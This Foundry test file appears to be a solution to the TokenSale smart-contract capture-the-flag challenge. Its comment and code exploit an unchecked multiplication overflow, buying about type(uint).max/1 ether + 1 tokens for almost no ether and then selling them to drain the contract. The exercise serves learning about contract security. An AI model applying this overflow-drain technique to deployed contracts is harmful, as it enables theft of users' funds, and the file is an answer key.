// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/TokenSale.sol";

contract TokenSaleTest is Test {
    TokenSale public tokenSale;
    ExploitContract public exploitContract;
    


    function setUp() public {
        // Deploy contracts
        tokenSale = (new TokenSale){value: 1 ether}();
        exploitContract = new ExploitContract(tokenSale);
        vm.deal(address(exploitContract), 4 ether);
    }

    // Use the instance of tokenSale and exploitContract
    /**
        The trick is calculating the price based on the numTokens while buying doesn't check the overflow, So we can try to get huge numTokens meanwhile the price is very low.
        For my calculation, 
            1: the numTokens(type(uint).max/PRICE_PER_TOKEN +1) will overflow the buyer math formula, and the msg.value is less than 1 eth; 
        So, after buying like above, then calcuating how many token can be sell to get the max eth of TokenSale. `address(tokenSale).balance / (1 ether)`
        Lastly, the eth balance of TokenSale will not greater than 1 ether.
     */
    function testIncrement() public {
        uint256  PRICE_PER_TOKEN = 1 ether;
        // Put your solution here
        uint amount = type(uint).max/PRICE_PER_TOKEN +1;
        uint msgValue;
        unchecked{
            msgValue = amount*(1 ether);
        }
        exploitContract.exploit(amount,msgValue); 

        // console.log("exploitContract balance of TokenSale",tokenSale.balanceOf(address(exploitContract)));
     
        // // console.log(type(uint).max/PRICE_PER_TOKEN);
        // unchecked{
        //     console.log(type(uint).max,"max value");
        //     console.log(type(uint).max/PRICE_PER_TOKEN,"how many nums token will make the max");
        //     console.log((type(uint).max/PRICE_PER_TOKEN) *PRICE_PER_TOKEN);
        //     console.log((type(uint).max/PRICE_PER_TOKEN +1) *PRICE_PER_TOKEN,"nums add 1");  // total < 1 ether (type(uint).max/PRICE_PER_TOKEN +1
            
        //     // calculat the ether, need to draw all , should seller the number of tokens 

        // }
        


        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenSale.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
